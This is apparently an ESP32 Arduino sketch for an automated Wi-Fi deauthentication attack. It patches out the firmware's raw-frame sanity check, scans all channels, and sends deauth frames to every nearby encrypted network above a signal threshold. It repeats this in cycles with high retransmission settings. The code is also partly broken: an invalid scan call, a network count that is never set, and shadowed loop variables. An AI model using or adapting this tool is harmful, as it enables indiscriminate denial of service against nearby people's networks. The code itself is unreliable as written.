extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Include Statements
// -----------------------------------------
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt_main.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_event_loop.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "definitions.h"
#include "deauth.h"

// Global Variables
// -----------------------------------------
RTC_DATA_ATTR int bootCount = 0;
int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int deauthPacketRetransmissions = 40; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets
int num_networks;

// Print Wakeup Reason
// ------------------------------------------
void print_wakeup_reason()
{
  esp_sleep_wakeup_cause_t wakeup_reason;

  wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason)
  {
  case ESP_SLEEP_WAKEUP_EXT0:
    Serial.println("Wakeup caused by external signal using RTC_IO");
    break;
  case ESP_SLEEP_WAKEUP_EXT1:
    Serial.println("Wakeup caused by external signal using RTC_CNTL");
    break;
  case ESP_SLEEP_WAKEUP_TIMER:
    Serial.println("Wakeup caused by timer");
    break;
  case ESP_SLEEP_WAKEUP_TOUCHPAD:
    Serial.println("Wakeup caused by touchpad");
    break;
  case ESP_SLEEP_WAKEUP_ULP:
    Serial.println("Wakeup caused by ULP program");
    break;
  default:
    Serial.printf("Wakeup was not caused by deep sleep: %d\n", wakeup_reason);
    break;
  }
}

int array_size(uint8_t *array) {
  size_t size_charray = sizeof(CHANNEL_LIST) / sizeof(CHANNEL_LIST[0]);
  return size_charray;
}

// Configure the Network
// ------------------------------------------
void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);   // Turn off LED
  Serial.begin(115200);
  delay(1000);

  ++bootCount;
  Serial.println("Boot number: " + String(bootCount));

  print_wakeup_reason();

  // Initialize WiFi in STA(station) mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  Serial.println("Station Mode Initialized");
  // Set configuration values
  wifi_country_t config = {
    .cc = "US",
    .schan = 1,
    .nchan = CHANNEL_MAX,
    .policy = WIFI_COUNTRY_POLICY_MANUAL,
  };
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  Serial.println("Setting Country Code to: " + String(config.cc));
  esp_wifi_set_country(&config);

  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
  Serial.println("Promiscuous Mode Enabled");

  // Start Deauth Attack
  Serial.println("Starting Deauth Attack");
}

void loop() {
  char err = false;
  while (true) {
    int ii = 0;
    size_t size_charray = sizeof(CHANNEL_LIST) / sizeof(CHANNEL_LIST[0]);

    while (ii < SCAN_ROUNDS)
    {
      int i;

      for (int i = 0; i < size_charray; i++)
      {
        int wifi_channel = CHANNEL_LIST[i];
        Serial.printf("Set channel to %d.\n", i);
        wifi_scan_config_t wifi_scan_config = {
          .ssid = NULL,
          .bssid = NULL,
          .channel = wifi_channel,
          .show_hidden = true,
          .scan_type = WIFI_SCAN_TYPE_ACTIVE
        };
        esp_wifi_scan_start(&wifi_scan_config, true);
        array net_lst = esp_wifi_scan_get_ap_records(MAX_LIST_SIZE, wifi_ap_record_t);

        if (num_networks > 0)
        {
          Serial.println("Networks found: " + String(num_networks));

          delay(scan_delay);
        } else {
          Serial.println("No networks found");
          delay(scan_delay);
        };

        for (int i = 0; i < num_networks; i++)
        {

          if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN && WiFi.encryptionType(i) != WIFI_AUTH_WEP && WiFi.RSSI(i) >= -75)
          {
            start_deauth(i, DEAUTH_REASON);
            Serial.println("Deauth attack completed");
            stop_deauth();
            delay(send_delay);
          };

        };

        delay(scan_delay);
      }

      ii++;
    }
    // Sleep to conserve power
    Serial.println("Going to sleep now");
    esp_sleep_enable_timer_wakeup(TIME_TO_SLEEP * uS_TO_S_FACTOR);
    Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) +
                  " Seconds");
    delay(1000);
    Serial.flush();
    esp_deep_sleep_start();
  }
}
